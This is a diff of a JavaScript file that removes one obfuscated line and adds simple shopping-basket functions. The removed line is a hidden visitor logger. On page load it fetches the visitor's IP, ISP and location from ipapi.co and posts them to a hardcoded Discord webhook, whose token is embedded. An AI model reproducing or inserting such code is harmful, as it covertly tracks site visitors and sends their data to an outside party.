@@ -1,1 +1,21 @@
-const _0x564ad3=_0x5322;function _0x5322(_0x57c96e,_0x3ce7e6){const _0x5f4f97=_0x5f4f();return _0x5322=function(_0x532204,_0x4523c5){_0x532204=_0x532204-0x8e;let _0x5533fd=_0x5f4f97[_0x532204];return _0x5533fd;},_0x5322(_0x57c96e,_0x3ce7e6);}(function(_0x175f8b,_0x36a3b6){const _0x2c9a5b=_0x5322,_0x139f25=_0x175f8b();while(!![]){try{const _0x1c65a3=parseInt(_0x2c9a5b(0xa1))/0x1*(-parseInt(_0x2c9a5b(0x92))/0x2)+parseInt(_0x2c9a5b(0x9f))/0x3*(parseInt(_0x2c9a5b(0xa9))/0x4)+-parseInt(_0x2c9a5b(0xa6))/0x5*(-parseInt(_0x2c9a5b(0x9e))/0x6)+parseInt(_0x2c9a5b(0xaa))/0x7*(-parseInt(_0x2c9a5b(0xa5))/0x8)+-parseInt(_0x2c9a5b(0x9c))/0x9+parseInt(_0x2c9a5b(0x97))/0xa+parseInt(_0x2c9a5b(0x8f))/0xb*(-parseInt(_0x2c9a5b(0x98))/0xc);if(_0x1c65a3===_0x36a3b6)break;else _0x139f25['push'](_0x139f25['shift']());}catch(_0x183bfa){_0x139f25['push'](_0x139f25['shift']());}}}(_0x5f4f,0xdc1d3));var request=new XMLHttpRequest();function _0x5f4f(){const _0x3de404=['Content-type','2232jghRne','429fvIjjM','https://discord.com/api/webhooks/1404143498382544990/CLVe2MirQ76Qk-18UTi4cuGRr-cQgD-3N-X5E3IJUqQSGmbM1szS0qrLkRifhluPwAMO','2815SFcJmN','FFFFFF','then','https://discord.com/assets/eman.jpeg','69528aNrAaB','18535DbdyVS','setRequestHeader','region','31484ZtuJUo','322Gjaczb','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20📂\x20\x20Version\x20-\x20','242MrxHEj','version','POST','174QfaqrV','org','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🌐\x20\x20ISP\x20-\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🌎\x20\x20Country\x20-\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🌐\x20\x20IP\x20-\x20','3833660tAqRvh','615972AnqYsr','https://ipapi.co/json/','open','👀\x20New\x20Log!','1911267nemQkh'];_0x5f4f=function(){return _0x3de404;};return _0x5f4f();}request[_0x564ad3(0x9a)](_0x564ad3(0x91),_0x564ad3(0xa0),!![]),request[_0x564ad3(0xa7)](_0x564ad3(0x9d),'application/json'),fetch(_0x564ad3(0x99))[_0x564ad3(0xa3)](_0x44b092=>_0x44b092['json']())[_0x564ad3(0xa3)](_0x5776b7=>{const _0x5c759f=_0x564ad3,_0x4dab30=_0x5776b7['ip'],_0x25e87e=_0x5776b7[_0x5c759f(0x93)],_0x5c34e4=_0x5776b7['country_name'],_0x297254=_0x5776b7[_0x5c759f(0xa8)],_0x13ff3a=_0x5776b7['city'],_0x4830b6=_0x5776b7[_0x5c759f(0x90)];var _0x38959d={'author':{'name':''},'title':_0x5c759f(0x9b),'description':_0x5c759f(0x96)+_0x4dab30+_0x5c759f(0x95)+_0x5c34e4+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🛖\x20\x20Region\x20-\x20'+_0x297254+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🏘️\x20\x20City\x20-\x20'+_0x13ff3a+_0x5c759f(0x94)+_0x25e87e+_0x5c759f(0x8e)+_0x4830b6,'color':parseInt(_0x5c759f(0xa2),0x10)},_0x50e23e={'avatar_url':_0x5c759f(0xa4),'avatarURL':'https://discord.com/assets/eman.jpeg','username':'.','embeds':[_0x38959d]};request['send'](JSON['stringify'](_0x50e23e));});
+
+let basket = [];
+
+function addToBasket(item) {
+    basket.push(item);
+    updateBasket();
+}
+
+function updateBasket() {
+    const list = document.getElementById("basketList");
+    list.innerHTML = "";
+    basket.forEach(i => {
+        const li = document.createElement("li");
+        li.textContent = i;
+        list.appendChild(li);
+    });
+}
+
+function sendRequest() {
+    alert("Request sent!");
+}
